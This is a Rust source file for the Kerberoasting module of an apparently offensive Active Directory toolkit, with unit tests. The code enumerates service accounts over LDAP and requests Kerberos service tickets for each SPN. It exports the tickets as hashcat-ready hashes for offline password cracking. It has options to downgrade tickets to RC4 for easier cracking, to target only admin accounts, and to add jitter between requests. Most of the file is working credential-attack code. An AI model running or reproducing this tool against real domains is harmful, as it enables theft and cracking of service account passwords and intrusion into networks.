//! Kerberoasting -- Enumerate accounts with SPNs and extract TGS tickets
//! for offline cracking (hashcat mode 13100/19700).
//!
//! Flow:
//! 1. Authenticate and obtain TGT
//! 2. LDAP query for user accounts with servicePrincipalName
//! 3. Request TGS for each SPN via TGS-REQ
//! 4. Extract encrypted ticket -> hashcat format

use crate::runner::HuntConfig;
use colored::Colorize;
use indicatif::{ProgressBar, ProgressStyle};
use overthrone_core::checkpoint::Checkpoint;
use overthrone_core::error::Result;
use overthrone_core::proto::kerberos::{self};
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::{debug, info, warn};

// ===========================================================
// Configuration
// ===========================================================
/// Kerberoast configuration
#[derive(Debug, Clone)]
pub struct KerberoastConfig {
    /// Specific SPNs to target (skip LDAP enumeration if provided)
    pub target_spns: Vec<String>,
    /// Skip disabled accounts
    pub skip_disabled: bool,
    /// Skip machine accounts ($ suffix)
    pub skip_machine_accounts: bool,
    /// Only target specific encryption types
    pub target_etypes: Vec<i32>,
    /// Output file for hashes
    pub output_file: Option<PathBuf>,
    /// Only target admin accounts (adminCount=1)
    pub admin_only: bool,
    /// Downgrade to RC4 (request only etype 23) for easier cracking
    pub downgrade_to_rc4: bool,
    /// SPN filter glob pattern (e.g. "http/*", "MSSQL*", "CIFS/*")
    /// Only SPNs matching this pattern will be targeted.
    pub spn_filter: Option<String>,
    /// Skip accounts that don't require Kerberos pre-authentication
    /// (AS-REP roastable -- more efficiently attacked via asreproast).
    /// Default: true
    pub skip_asrep_roastable: bool,
    /// Path to checkpoint file for resume
    pub checkpoint_path: Option<PathBuf>,
    /// Resume from checkpoint if available
    pub resume: bool,
    /// Print results as they are found
    pub live_output: bool,
}

impl Default for KerberoastConfig {
    fn default() -> Self {
        Self {
            target_spns: Vec::new(),
            skip_disabled: true,
            skip_machine_accounts: true,
            target_etypes: vec![
                kerberos::ETYPE_RC4_HMAC,
                kerberos::ETYPE_AES256_CTS,
                kerberos::ETYPE_AES128_CTS,
            ],
            output_file: None,
            admin_only: false,
            downgrade_to_rc4: false,
            spn_filter: None,
            skip_asrep_roastable: true,
            checkpoint_path: None,
            resume: false,
            live_output: true,
        }
    }
}

// ===========================================================
// Result
// ===========================================================
/// Structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberoastResult {
    /// Hash value
    pub hashes: Vec<RoastedService>,
    /// Service Principal Name
    pub spns_checked: usize,
    /// skipped field
    pub skipped: Vec<(String, String)>,
    /// Error information
    pub errors: Vec<(String, String)>,
}
/// Structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RoastedService {
    /// Username for authentication
    pub username: String,
    /// Service Principal Name
    pub spn: String,
    /// Domain FQDN
    pub domain: String,
    /// Classification for this object.
    pub etype: String,
    /// Hash value
    pub hash_string: String,
    /// Object or account name.
    pub distinguished_name: Option<String>,
    /// Item count
    pub admin_count: bool,
    /// Password for authentication
    pub password_last_set: Option<String>,
}

// ===========================================================
// LDAP Enumeration
// ===========================================================

#[derive(Debug, Clone)]
struct SpnAccount {
    sam_account_name: String,
    spns: Vec<String>,
    distinguished_name: String,
    admin_count: bool,
    password_last_set: Option<String>,
}

/// Enumerate user accounts with SPNs using the high-level LdapSession API
async fn enumerate_spn_accounts(
    config: &HuntConfig,
    kc: &KerberoastConfig,
) -> Result<Vec<SpnAccount>> {
    info!("LDAP: Enumerating SPN accounts (kerberoastable)");

    let mut conn = if config.use_hash {
        ldap::LdapSession::connect_with_hash(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    } else {
        ldap::LdapSession::connect(
            &config.dc_ip,
            &config.domain,
            &config.username,
            &config.secret,
            config.use_ldaps,
        )
        .await?
    };

    let ad_users = conn.find_kerberoastable().await?;

    let mut accounts = Vec::new();

    for u in &ad_users {
        // Skip disabled accounts
        if kc.skip_disabled && !u.enabled {
            debug!("Skipping disabled account: {}", u.sam_account_name);
            continue;
        }

        // Skip accounts that don't require Kerberos pre-authentication
        // These are more efficiently attacked via AS-REP roasting
        if kc.skip_asrep_roastable && u.dont_req_preauth {
            debug!(
                "Skipping AS-REP-roastable account (use asreproast instead): {}",
                u.sam_account_name
            );
            continue;
        }

        // Skip machine accounts
        if kc.skip_machine_accounts && u.sam_account_name.ends_with('$') {
            debug!("Skipping machine account: {}", u.sam_account_name);
            continue;
        }

        // Skip krbtgt (always has SPN, never useful)
        if u.sam_account_name.to_lowercase() == "krbtgt" {
            continue;
        }

        if u.service_principal_names.is_empty() {
            continue;
        }

        // Admin-only filter
        if kc.admin_only && !u.admin_count {
            continue;
        }

        // SPN filter glob matching (supports * and ? wildcards)
        if let Some(ref filter) = kc.spn_filter {
            let matched: Vec<String> = u
                .service_principal_names
                .iter()
                .filter(|spn| wildcard_match(spn, filter))
                .cloned()
                .collect();
            if matched.is_empty() {
                continue;
            }
            accounts.push(SpnAccount {
                sam_account_name: u.sam_account_name.clone(),
                spns: matched,
                distinguished_name: u.distinguished_name.clone(),
                admin_count: u.admin_count,
                password_last_set: u.pwd_last_set.clone(),
            });
            continue;
        }

        accounts.push(SpnAccount {
            sam_account_name: u.sam_account_name.clone(),
            spns: u.service_principal_names.clone(),
            distinguished_name: u.distinguished_name.clone(),
            admin_count: u.admin_count,
            password_last_set: u.pwd_last_set.clone(),
        });
    }

    conn.disconnect().await?;
    info!("LDAP: Found {} kerberoastable accounts", accounts.len());
    Ok(accounts)
}

// ===========================================================
// Public Runner
// ===========================================================

pub async fn run(config: &HuntConfig, kc: &KerberoastConfig) -> Result<KerberoastResult> {
    info!("{}", "=== KERBEROAST ===".bold().yellow());

    // Step 1: Get or request TGT
    let tgt = match &config.tgt {
        Some(t) => t.clone(),
        None => {
            kerberos::request_tgt(
                &config.dc_ip,
                &config.domain,
                &config.username,
                &config.secret,
                config.use_hash,
            )
            .await?
        }
    };

    // Step 2: Enumerate SPN accounts (or use provided list)
    #[allow(clippy::type_complexity)]
    let spn_targets: Vec<(String, String, Option<String>, bool, Option<String>)> =
        if kc.target_spns.is_empty() {
            let accounts = enumerate_spn_accounts(config, kc).await?;
            let mut targets = Vec::new();
            for acct in accounts {
                // Iterate ALL SPNs for each account -- each SPN may have a distinct ticket
                for spn in &acct.spns {
                    targets.push((
                        acct.sam_account_name.clone(),
                        spn.clone(),
                        Some(acct.distinguished_name.clone()),
                        acct.admin_count,
                        acct.password_last_set.clone(),
                    ));
                }
            }
            targets
        } else {
            kc.target_spns
                .iter()
                .map(|spn| ("unknown".to_string(), spn.clone(), None, false, None))
                .collect()
        };

    if spn_targets.is_empty() {
        warn!("No kerberoastable accounts found");
        return Ok(KerberoastResult {
            hashes: Vec::new(),
            spns_checked: 0,
            skipped: Vec::new(),
            errors: Vec::new(),
        });
    }

    // Step 3: Request TGS for each SPN
    let ckpt_path = kc.checkpoint_path.clone().unwrap_or_else(|| {
        overthrone_core::checkpoint::checkpoint_path(
            None,
            "kerberoast",
            &config.domain,
            &config.dc_ip,
        )
    });
    let do_resume = kc.resume && ckpt_path.exists();
    let mut ckpt = Checkpoint::load_or_new(
        &ckpt_path,
        "kerberoast",
        &config.dc_ip,
        &config.domain,
        spn_targets.len(),
    );

    if do_resume {
        info!(
            "Resuming kerberoast from checkpoint: {} ({} prior results)",
            ckpt_path.display(),
            ckpt.results().len()
        );
    }

    #[allow(clippy::type_complexity)]
    let to_process: Vec<&(String, String, Option<String>, bool, Option<String>)> = if do_resume {
        let already: std::collections::HashSet<&str> =
            ckpt.results().iter().map(|e| e.item.as_str()).collect();
        let pending: Vec<_> = spn_targets
            .iter()
            .filter(|(_, spn, _, _, _)| !already.contains(spn.as_str()))
            .collect();
        if pending.is_empty() {
            info!("All SPNs already processed -- using cached results.");
        } else {
            info!(
                "{} SPNs remain, skipping {} already done",
                pending.len(),
                spn_targets.len() - pending.len()
            );
        }
        pending
    } else {
        spn_targets.iter().collect()
    };

    let pb = ProgressBar::new(spn_targets.len() as u64);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.yellow} [{bar:40.yellow/dim}] {pos}/{len} Kerberoasting {msg}")
            .unwrap_or_else(|e| {
                warn!("Progress bar template error: {e}");
                ProgressStyle::default_bar()
            })
            .progress_chars("█▓░"),
    );
    pb.set_position(ckpt.processed_count() as u64);

    let mut hashes: Vec<RoastedService> = Vec::new();
    let mut skipped: Vec<(String, String)> = Vec::new();
    let mut errors: Vec<(String, String)> = Vec::new();

    // Restore prior results from checkpoint
    for entry in ckpt.results() {
        if entry.status == "hash" {
            if let Some(ref detail) = entry.detail {
                hashes.push(RoastedService {
                    username: "unknown".to_string(),
                    spn: entry.item.clone(),
                    domain: config.domain.clone(),
                    etype: if detail.contains("$krb5tgs$23$") {
                        "RC4"
                    } else if detail.contains("$krb5tgs$18$") {
                        "AES256"
                    } else {
                        "AES128"
                    }
                    .to_string(),
                    hash_string: detail.clone(),
                    distinguished_name: None,
                    admin_count: false,
                    password_last_set: None,
                });
            }
        } else if entry.status == "error" {
            errors.push((entry.item.clone(), entry.detail.clone().unwrap_or_default()));
        } else if entry.status == "skipped" {
            skipped.push((entry.item.clone(), entry.detail.clone().unwrap_or_default()));
        }
    }

    for (sam, spn, dn, admin_count, pwd_last_set) in &to_process {
        pb.set_message(spn.clone());

        let roast_result = if kc.downgrade_to_rc4 {
            kerberos::kerberoast_ex(&config.dc_ip, &tgt, spn, false).await
        } else {
            kerberos::kerberoast_ex(&config.dc_ip, &tgt, spn, true).await
        };
        match roast_result {
            Ok(crackable) => {
                let etype_label = match crackable.hash_string.as_str() {
                    s if s.contains("$krb5tgs$23$") => "RC4",
                    s if s.contains("$krb5tgs$18$") => "AES256",
                    s if s.contains("$krb5tgs$17$") => "AES128",
                    _ => "unknown",
                };

                let roasted = RoastedService {
                    username: sam.clone(),
                    spn: spn.clone(),
                    domain: config.domain.clone(),
                    etype: etype_label.to_string(),
                    hash_string: crackable.hash_string.clone(),
                    distinguished_name: dn.clone(),
                    admin_count: *admin_count,
                    password_last_set: pwd_last_set.clone(),
                };

                let marker = if *admin_count {
                    " [ADMIN]".red().bold().to_string()
                } else {
                    String::new()
                };

                ckpt.record(spn, "hash", Some(crackable.hash_string.clone()));

                if kc.live_output {
                    println!(
                        "  {} {} ({}) -- {} {}{}",
                        "[+]".green(),
                        sam.bold(),
                        spn.dimmed(),
                        "etype:".dimmed(),
                        etype_label.cyan(),
                        marker
                    );
                }

                hashes.push(roasted);
            }
            Err(e) => {
                let err_str = e.to_string();
                if err_str.contains("S_PRINCIPAL_UNKNOWN") {
                    ckpt.record(spn, "skipped", Some("SPN not found".to_string()));
                    skipped.push((spn.clone(), "SPN not found".to_string()));
                } else {
                    ckpt.record(spn, "error", Some(err_str.clone()));
                    errors.push((spn.clone(), err_str));
                }
            }
        }

        config.apply_jitter().await;
        pb.inc(1);
    }
    pb.finish_with_message("done");
    ckpt.save();

    // Clean up checkpoint on full success
    if errors.is_empty() && to_process.len() == spn_targets.len() && !hashes.is_empty() {
        let _ = std::fs::remove_file(&ckpt_path);
    }

    // Step 4: Save hashes
    if let Some(ref output_path) = kc.output_file {
        let hash_lines: String = hashes
            .iter()
            .map(|h| h.hash_string.as_str())
            .collect::<Vec<_>>()
            .join("\n");
        tokio::fs::write(output_path, &hash_lines).await?;
        info!("Saved {} hashes to {}", hashes.len(), output_path.display());
    }

    info!(
        "Kerberoast: {} hashes, {} skipped, {} errors",
        hashes.len().to_string().green(),
        skipped.len(),
        errors.len()
    );

    Ok(KerberoastResult {
        spns_checked: spn_targets.len(),
        hashes,
        skipped,
        errors,
    })
}

/// Simple wildcard pattern matching (* matches any chars, ? matches single char)
fn wildcard_match(text: &str, pattern: &str) -> bool {
    let text_bytes = text.as_bytes();
    let pat_bytes = pattern.as_bytes();
    let mut ti = 0;
    let mut pi = 0;
    let mut star_ti: Option<usize> = None;
    let mut star_pi: Option<usize> = None;

    while ti < text_bytes.len() {
        if pi < pat_bytes.len() && (pat_bytes[pi] == b'?' || pat_bytes[pi] == text_bytes[ti]) {
            ti += 1;
            pi += 1;
        } else if pi < pat_bytes.len() && pat_bytes[pi] == b'*' {
            star_ti = Some(ti);
            star_pi = Some(pi);
            pi += 1;
        } else if let (Some(st), Some(sp)) = (star_ti, star_pi) {
            ti = st + 1;
            star_ti = Some(ti);
            pi = sp + 1;
        } else {
            return false;
        }
    }
    while pi < pat_bytes.len() && pat_bytes[pi] == b'*' {
        pi += 1;
    }
    pi == pat_bytes.len()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wildcard_match_exact() {
        assert!(wildcard_match(
            "HTTP/dc01.corp.local",
            "HTTP/dc01.corp.local"
        ));
    }

    #[test]
    fn test_wildcard_match_star() {
        assert!(wildcard_match("HTTP/dc01.corp.local", "HTTP/*"));
    }

    #[test]
    fn test_wildcard_match_prefix_star() {
        assert!(wildcard_match(
            "MSSQLSvc/sql01.corp.local:1433",
            "MSSQLSvc/*"
        ));
    }

    #[test]
    fn test_wildcard_match_no_match() {
        assert!(!wildcard_match("HTTP/dc01.corp.local", "LDAP/*"));
    }

    #[test]
    fn test_wildcard_match_question_mark() {
        assert!(wildcard_match("CIFS/dc01", "CIFS/dc?1"));
        assert!(!wildcard_match("CIFS/dc01", "CIFS/dc?2"));
    }

    #[test]
    fn test_wildcard_match_empty() {
        assert!(wildcard_match("", ""));
        assert!(!wildcard_match("a", ""));
    }

    // -- Pre-auth skip logic ----------------------------------
    //
    // The kerberoast pre-auth check at the rust-side skip level
    // (line ~158) uses `u.dont_req_preauth`, which is populated
    // by `parse_ad_user` from the bit `userAccountControl & 0x400000`
    // (UF_DONT_REQUIRE_PREAUTH). These tests pin the bit value and
    // prove the skip works on a mock ad-user set.

    /// Reference: UF_DONT_REQUIRE_PREAUTH = 0x400000 (4194304).
    /// If this test ever fails, AD documentation has changed and
    /// the LDAP filter / UAC check in overthrone-core need an update.
    #[test]
    fn preauth_uac_bit_value_is_documented() {
        const UF_DONT_REQUIRE_PREAUTH: u32 = 0x400000;
        assert_eq!(UF_DONT_REQUIRE_PREAUTH, 4_194_304);
    }

    /// Simulates the filter logic from `parse_ad_user` in
    /// `overthrone-core/src/proto/ldap.rs`. If this fails, the
    /// `dont_req_preauth` field is being populated from a wrong bit
    /// and the kerberoast skip will silently miss preauth-vulnerable
    /// accounts.
    #[test]
    fn parse_ad_user_marks_dont_req_preauth_correctly() {
        const UAC_DONT_REQ_PREAUTH: u32 = 0x400000;
        let uac_no_preauth: u32 = 0x400000; // bit 22 set
        let uac_preauth_required: u32 = 0x000200; // NORMAL_ACCOUNT only
        let uac_disabled_no_preauth: u32 = 0x400002; // disabled + no preauth

        let no_pre1 = uac_no_preauth & UAC_DONT_REQ_PREAUTH != 0;
        let no_pre2 = uac_preauth_required & UAC_DONT_REQ_PREAUTH != 0;
        let no_pre3 = uac_disabled_no_preauth & UAC_DONT_REQ_PREAUTH != 0;
        assert!(no_pre1, "plain no-preauth should be detected");
        assert!(!no_pre2, "normal account must NOT be flagged as no-preauth");
        assert!(no_pre3, "disabled+no-preauth should still flag preauth");
    }

    /// Simulates the `for u in &ad_users` filter loop in
    /// `enumerate_spn_accounts` (lines 149-184). The combination of
    /// `skip_asrep_roastable=true` and `u.dont_req_preauth=true`
    /// must result in the account being skipped (not in the output).
    #[test]
    fn skip_asrep_roastable_filters_dont_req_preauth_accounts() {
        // Mock a small user set
        struct MockUser {
            sam: &'static str,
            enabled: bool,
            dont_req_preauth: bool,
            is_machine: bool,
            spns: Vec<&'static str>,
        }
        let users = [
            MockUser {
                sam: "normaluser",
                enabled: true,
                dont_req_preauth: false,
                is_machine: false,
                spns: vec!["HTTP/dc01"],
            },
            MockUser {
                sam: "asrepuser",
                enabled: true,
                dont_req_preauth: true,
                is_machine: false,
                spns: vec!["HTTP/dc01"],
            },
            MockUser {
                sam: "disableduser",
                enabled: false,
                dont_req_preauth: false,
                is_machine: false,
                spns: vec!["HTTP/dc01"],
            },
            MockUser {
                sam: "machine$",
                enabled: true,
                dont_req_preauth: false,
                is_machine: true,
                spns: vec!["HTTP/dc01"],
            },
        ];

        let skip_disabled = true;
        let skip_asrep_roastable = true;
        let skip_machine_accounts = true;

        let kept: Vec<&str> = users
            .iter()
            .filter(|u| {
                if skip_disabled && !u.enabled {
                    return false;
                }
                if skip_asrep_roastable && u.dont_req_preauth {
                    return false;
                }
                if skip_machine_accounts && u.is_machine {
                    return false;
                }
                !u.spns.is_empty()
            })
            .map(|u| u.sam)
            .collect();

        assert_eq!(kept, vec!["normaluser"]);
    }

    /// When `skip_asrep_roastable=false`, the preauth account should
    /// NOT be filtered (operator wants to kerberoast it anyway).
    #[test]
    fn skip_asrep_roastable_false_keeps_preauth_accounts() {
        struct MockUser {
            dont_req_preauth: bool,
        }
        let users = [
            MockUser {
                dont_req_preauth: false,
            },
            MockUser {
                dont_req_preauth: true,
            },
        ];
        let skip_asrep_roastable = false;
        let kept: Vec<bool> = users
            .iter()
            .filter(|u| !(skip_asrep_roastable && u.dont_req_preauth))
            .map(|u| u.dont_req_preauth)
            .collect();
        assert_eq!(kept, vec![false, true]);
    }

    /// `KerberoastConfig::default()` should have `skip_asrep_roastable=true`
    /// so out-of-the-box behavior doesn't waste SPN requests.
    #[test]
    fn default_config_skips_asrep_roastable() {
        let kc = KerberoastConfig::default();
        assert!(kc.skip_asrep_roastable);
        assert!(kc.skip_disabled);
        assert!(kc.skip_machine_accounts);
        assert!(!kc.admin_only);
        assert!(!kc.downgrade_to_rc4);
    }

    /// All other UAC bits must NOT cause a false positive on
    /// `dont_req_preauth`. This guards against accidental name/bit
    /// collisions if someone later refactors the constant.
    #[test]
    fn no_false_positives_for_other_uac_bits() {
        const UAC_DONT_REQ_PREAUTH: u32 = 0x400000;
        // Sample of UAC bits that are NOT DONT_REQ_PREAUTH:
        //   UF_SCRIPT                     0x00000001
        //   UF_ACCOUNTDISABLE             0x00000002
        //   UF_HOMEDIR_REQUIRED           0x00000008
        //   UF_LOCKOUT                    0x00000010
        //   UF_PASSWD_NOTREQD             0x00000020
        //   UF_PASSWD_CANT_CHANGE         0x00000040
        //   UF_NORMAL_ACCOUNT             0x00000200
        //   UF_DONT_EXPIRE_PASSWD         0x00010000
        //   UF_TRUSTED_FOR_DELEGATION     0x00080000
        //   UF_NOT_DELEGATED              0x00100000
        //   UF_USE_DES_KEY_ONLY           0x00200000
        //   UF_TRUSTED_TO_AUTH_FOR_DELEG  0x01000000
        //   UF_PASSWORD_EXPIRED           0x00800000
        let other_bits: [u32; 13] = [
            0x00000001, 0x00000002, 0x00000008, 0x00000010, 0x00000020, 0x00000040, 0x00000200,
            0x00010000, 0x00080000, 0x00100000, 0x00200000, 0x01000000, 0x00800000,
        ];
        for &bits in &other_bits {
            assert!(
                bits & UAC_DONT_REQ_PREAUTH == 0,
                "bit 0x{:08x} unexpectedly matches UAC_DONT_REQ_PREAUTH",
                bits
            );
        }
    }
}
